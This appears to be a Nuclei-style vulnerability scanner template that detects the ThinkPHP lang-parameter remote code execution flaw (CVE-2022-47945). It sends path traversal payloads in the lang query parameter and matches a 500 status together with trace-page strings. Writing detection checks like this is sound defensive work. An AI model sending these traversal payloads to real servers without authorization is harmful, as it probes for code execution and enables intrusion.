id: thinkphp-lang-rce
info:
  name: ThinkPHP lang Parameter Remote Code Execution Vulnerability (CVE-2022-47945)
  author: ProjectDiscoveryAI
  severity: critical
  tags: rce,CVE-2022-47945

http:
  - method: GET
    path:
      - "{{BaseURL}}/?lang=../../thinkphp/base"
      - "{{BaseURL}}/?lang=../../../../../vendor/topthink/think-trace/src/TraceDebug"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: word
        part: body
        words:
          - "* 页面Trace中间件"
          - "class=\"trace\""
          - "TraceDebug.php"
